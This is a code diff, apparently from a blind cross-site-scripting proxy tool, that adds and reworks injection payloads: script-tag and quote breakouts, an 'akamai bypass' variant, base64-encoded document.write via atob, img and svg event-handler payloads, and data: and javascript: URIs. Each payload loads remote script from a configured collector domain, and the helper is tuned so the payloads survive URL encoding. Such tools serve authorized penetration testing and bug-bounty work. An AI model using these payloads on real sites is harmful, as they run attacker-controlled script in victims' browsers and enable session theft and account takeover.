@@ -30,6 +30,8 @@ futures_sess = FuturesSession()
 
 def payload_id_to_payload( payload_id, payload_token ):
     js_attrib_js = 'var a=document.createElement("script");a.src="https://' + settings["domain"] + '/' + payload_token + '";document.head.appendChild(a);'
+    redirecting_js = "<a ><script src=https://{domain}/{token}{pad}></script><script>setTimeout(function(){{window.location=\"https://www.google.com\"}},999);</script>"
+    base_script = "<a ><script src=https://{domain}/{token}{pad}></script>"
 
     if payload_id == "generic_script_tag_payload":
         return "\"><script src=https://" + settings["domain"] + '/' + payload_token + "></script>"
@@ -51,59 +53,38 @@ def payload_id_to_payload( payload_id, payload_token ):
 	return "\";jQuery.getScript(\"//{domain}/{token}\");//".format(domain=settings['domain'], token=payload_token)
     elif payload_id == "js_akamai_bypass_payload":
 	return "\";var a=document.createElement(\"script\");a.setAttribute(\"src\",\"//{domain}/{token}\");document.head.appendChild(a);//".format(domain=settings['domain'], token=payload_token)
+    elif payload_id == "js_akamai_apos_payload":
+        return "';var a=document.createElement('script');a.setAttribute('src','//{domain}/{token}');document.head.appendChild(a);//".format(domain=settings['domain'], token=payload_token)
     elif payload_id == "data_url_payload":
-	base = "13<script src=\"{proto}//{domain}/{token}{pad}\"></script><script>setTimeout(function(){{window.location=\"https://www.yahoo.com\"}},4000);</script>37"
-	return "data:a;base64,"+base64_injection_str(base, payload_token)
+	return "data:a;base64,"+base64_injection_str(redirecting_js, payload_token)
     elif payload_id == "js_uri_write_payload":
-	base = "13<script src={proto}//{domain}/{token}{pad}></script><script>setTimeout(function(){{window.location=\'https://www.yahoo.com\'}},4000);</script>37"
-	return 'javascript:document.write(atob(\''+base64_injection_str(base, payload_token)+'\'));'
+	return 'javascript:document.write(atob(\''+base64_injection_str(redirecting_js, payload_token)+'\'));'
     elif payload_id == "js_write_payload":
-        base = "13<script src={proto}//{domain}/{token}{pad}></script>37"
-        return '";document.write(atob("'+base64_injection_str(base, payload_token)+'"));//'
+        return '";document.write(atob("'+base64_injection_str(base_script, payload_token)+'"));//'
+    elif payload_id == "js_write_apos_payload":
+	return "';document.write(atob('"+base64_injection_str(base_script, payload_token)+"'));//"
     elif payload_id == "img_write_payload":
-	base = "13<script src={proto}//{domain}/{token}{pad}></script>37"
-	return '";</script><img id='+base64_injection_str(base, payload_token)+' src=x onerror=document.write(atob(this.id))>'
-    elif payload_id == "apos_script_payload":
-	return "'><script src=//{domain}/{token}></script>".format(domain=settings['domain'], token=payload_token)
+	return '\'>"></textarea></script><img id='+base64_injection_str(base_script, payload_token)+' src=x onerror=document.write(atob(this.id))>'
+    elif payload_id == "svg_payload":
+	return '\'>"></textarea><svg/onload=document.write(atob(this.id)) id='+base64_injection_str(base_script, payload_token)+'>'
+    elif payload_id == "textarea_payload":
+	return "'>\"></textarea><script src=//{domain}/{token}></script>".format(domain=settings['domain'], token=payload_token)
     else:
         return "\"><script src=https://" + settings["domain"] + '/' + payload_token + "></script>"
 
 def base64_injection_str( template, payload_token ):
-        script = template.format(proto='', domain=settings['domain'], token='', pad='')
-        enc = base64.b64encode(script)
-        if enc.find('+') != -1:
-                script = template.format(proto='', domain=settings['domain'], token=payload_token, pad='')
+	script = template.format(domain=settings['domain'], token=payload_token, pad='')
+	enc = base64.b64encode(script)
+	if enc.find('+') != -1:
+                script = template.format(domain=settings['domain'], token=payload_token, pad='?a')
                 enc = base64.b64encode(script)
-                if enc.find('+') != -1:
-                        script = template.format(proto='https', domain=settings['domain'], token='', pad='')
-                        enc = base64.b64encode(script)
-                        if enc.find('+') != -1:
-                                script = template.format(proto='https', domain=settings['domain'], token=payload_token, pad='')
-                                enc = base64.b64encode(script)
-                                if enc.find('+') != -1:
-                                        script = template.format(proto='https', domain=settings['domain'], token=payload_token, pad='?aaa')
-                                        return html_escape(base64.b64encode(script)) # Give up and return
-                                else:
-                                        return html_escape(enc)
-                        else:
-                                script = template.format(proto='https', domain=settings['domain'], token=payload_token, pad='')
-                                enc = base64.b64encode(script)
-                                if enc.find('+') != -1:
-                                        script = template.format(proto='https', domain=settings['domain'], token=payload_token, pad='?aaa')
-                                        return html_escape(base64.b64encode(script)) # Give up and return
-                                else:
-                                        return html_escape(enc)
-                else:
-                        return html_escape(enc)
-
+		if enc.find('+') != -1:
+			script = template.format(domain=settings['domain'], token=payload_token, pad='?aaa')
+			return str(base64.b64encode(script)).replace('+', '%2B') # Give up and return
+		else:
+			return enc
         else:
-                script = template.format(proto='', domain=settings['domain'], token=payload_token, pad='')
-                enc = base64.b64encode(script)
-                if enc.find('+') != -1:
-                        script = template.format(proto='', domain=settings['domain'], token=payload_token, pad='?aaa')
-                        return html_escape(base64.b64encode(script)) # Give up and return 
-                else:
-                        return html_escape(enc)
+        	return enc
 
 def request( context, flow ):
     probe_ids = []
